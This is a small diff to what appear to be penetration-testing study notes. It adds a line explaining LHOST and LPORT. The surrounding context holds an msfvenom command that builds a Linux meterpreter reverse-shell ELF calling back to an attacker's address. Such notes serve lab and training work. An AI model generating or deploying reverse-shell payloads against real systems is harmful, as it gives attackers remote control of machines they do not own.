@@ -299,7 +299,8 @@ lport => 7777
 ```
 
 ####  Other Payloads
-- Linux Executable and Linkable Format (elf)
+In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.  
+- Linux Executable and Linkable Format (elf)  
     `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  
     Make sure permissions.
 - Windows  
